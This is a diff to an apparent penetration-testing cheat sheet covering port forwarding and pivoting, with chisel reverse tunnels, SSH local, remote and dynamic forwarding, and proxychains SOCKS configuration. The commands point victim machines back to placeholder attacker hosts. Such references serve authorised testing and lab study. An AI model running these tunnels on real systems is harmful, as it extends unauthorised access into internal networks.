@@ -72,7 +72,7 @@ Víctima
 ```
 ./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
 ```
-#### SSH 
+#### SSH (nmap must have -sT parameter if you want to scan ports with proxychains)
 
 Local Port Forwarding
 ```
@@ -82,7 +82,11 @@ Remort Port Forwarding (Firewall)
 ```
 ssh -N -R ATTACKER_IP:ATTACKER_PORT(listener):VICTIM_IP:VICTIM_PORT attackeruser@attackerip
 ```
-Dynamic Port Forwarding (Pivoting)
+### Pivoting
+
+#### SSH
+
+Dynamic Port Forwarding
 ```
 ssh -N -D ATTACKER_IP:ATTACKER_PORT victimuser@ip
 ```
@@ -92,7 +96,26 @@ ssh -N -D ATTACKER_IP:ATTACKER_PORT victimuser@ip
 # add proxy here ...
 # meanwile
 # defaults set to "tor"
-socks4 ATTACKER_IP(localhost) ATTACKER_PORT
+socks4 127.0.0.1 ATTACKER_PORT
+```
+
+#### Chisel
+
+Attacker machine
+```
+./chisel server --reverse -p PORT --socks5
+```
+Victime Machine
+```
+./chisel client ATTACKER_IP:ATTACKER_PORT R:127.0.0.1:socks
+```
+(Edit Proxychains.conf)
+```
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 ATTACKER_PORT
 ```
 
 ### DNS
